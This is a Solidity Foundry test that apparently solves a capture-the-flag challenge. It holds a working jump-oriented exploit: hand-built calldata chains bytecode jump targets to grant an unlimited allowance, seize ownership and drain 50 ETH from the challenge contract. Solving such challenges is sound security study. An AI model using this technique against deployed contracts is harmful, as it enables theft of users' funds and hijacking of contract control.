pragma solidity 0.7.6;

import "../src/jop/private/Challenge.sol";
import "forge-std/Test.sol";

interface ChallengeInterface is IERC20 {
    function buyTokens() external payable;
    function owner() external view returns (address);
}

contract Exploit is Test {
    ChallengeInterface challenge;
    address player = address(0xBaDa55);

    function setUp() external {
        challenge = ChallengeInterface(address(new Challenge(990, 1010)));
        challenge.buyTokens{value: 50 ether}();
        vm.deal(player, 1 ether);
    }

    function isSolved() public view returns (bool) {
        return  challenge.owner() == 0xdeaDDeADDEaDdeaDdEAddEADDEAdDeadDEADDEaD &&
                challenge.balanceOf(address(this)) == 0 &&
                address(challenge).balance == 0;
    }

    function testJopExploit() public {
        // Runtime bytecode to work with
        //console.logBytes(type(Challenge).runtimeCode);

        address owner = address(this);
        uint256 base = uint256(0x0f5f);
        bytes memory data0 = abi.encodeWithSignature("deusExMachina(uint256)", base); 
        bytes memory data1 = new bytes(644);
        assembly {
            let start := add(data1, 32)
            mstore(start, shl(224, 0xd0febe4c))
            mstore(add(start, 4), 0x01)                                             // dummy value
            mstore(add(start, 36), base)                                            // jump to base
            mstore(add(start, 68), 0x84)                                            // payload offset
            mstore(add(start, 100), base)                                           // jump to base
            mstore(add(start, 132), 0x2c5)                                          // jump to exit
            mstore(add(start, 164), owner)                                          // allowance from
            mstore(add(start, 196), base)                                           // jump to base
            mstore(add(start, 228), 0x104)                                          // payload offset
            mstore(add(start, 260), 0xBaDa55)                                       // allowance to
            mstore(add(start, 292), not(0))                                         // set infinite allowance
            mstore(add(start, 324), base)                                           // jump to base
            mstore(add(start, 356), 0x184)                                          // payload offset
            mstore(add(start, 388), 0xb03)                                          // jump to set allowance
            mstore(add(start, 420), 0xBaDa55)                                       // ETH receiver
            mstore(add(start, 452), 0x9b0)                                          // jump to transfer owner
            mstore(add(start, 484), 0x204)                                          // payload offset
            mstore(add(start, 516), 0x2b5e3af16b1880004)                            // ETH amount, 50 ETH + 4 wei
            mstore(add(start, 548), 0xeb4)                                          // jump to transfer ETH
            mstore(add(start, 580), 0x7c2)                                          // jump to accept ownership
            mstore(add(start, 612), 0xdeaDDeADDEaDdeaDdEAddEADDEAdDeadDEADDEaD)     // new owner
        }

        vm.startPrank(player);
        // set base
        address(challenge).call(data0);
        // attack
        address(challenge).call{value: 4}(data1);
        challenge.transferFrom(address(this), player, challenge.balanceOf(address(this)));

        require(isSolved(), "NOT SOLVED");
    }
}
